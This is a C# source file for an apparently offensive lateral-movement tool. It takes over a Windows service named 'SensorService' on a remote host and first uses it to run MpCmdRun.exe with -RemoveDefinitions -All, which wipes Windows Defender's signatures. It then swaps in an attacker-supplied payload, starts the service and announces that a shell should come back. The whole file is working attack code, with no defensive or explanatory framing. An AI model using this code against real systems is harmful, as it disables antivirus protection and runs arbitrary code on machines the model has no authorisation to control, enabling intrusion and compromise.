using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace PsExecLat
{
    public class Program
    {
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);
        
        public static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                System.Console.WriteLine("Please enter the target machine and path to executable");
                return;
                
            }

            string target = args[0]; //hostname
            string payload = args[1]; //Payload

            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
            if (SCMHandle == IntPtr.Zero)
            {
                Console.WriteLine("Error in calling OpenSCManager: " + Marshal.GetLastWin32Error());
            }
            else
            {
                Console.WriteLine("");
            }

            string ServiceName = "SensorService";
            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);
            if (schService == IntPtr.Zero)
            {
                Console.WriteLine("Error in calling OpenService: " + Marshal.GetLastWin32Error());
            }
            else
            {
                Console.WriteLine("[+] OpenService connected");
            }

            string signature = "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All";

            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, signature, null, null, null, null, null, null);
            if (bResult == false)
            {
                Console.WriteLine("Error in calling ChangeServiceConfig: " + Marshal.GetLastWin32Error());
            }
            else
            {
                Console.WriteLine("[+] ChangeServiceConfig connected -> Removing Bad Signatures");
            }

            bResult = StartService(schService, 0, null);
            if (bResult == false)
            {
                Console.WriteLine("Error in calling StartService: " + Marshal.GetLastWin32Error());
            }
            else
            {
                Console.WriteLine("[+] Starting Service");
            }

            bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);
            if (bResult == false)
            {
                Console.WriteLine("Error in calling ChangeServiceConfig: " + Marshal.GetLastWin32Error());
            }
            else
            {
                Console.WriteLine("[+] Updating Service with Our Food");
            }
            bResult = StartService(schService, 0, null);
            if (bResult == false)
            {
                Console.WriteLine("Error in calling StartService: " + Marshal.GetLastWin32Error());
            }
            else
            {
                Console.WriteLine("[+] Executing Modified Service");
                Console.WriteLine("[+] Exepect a Shell back :)");
            }
        }
    }
}
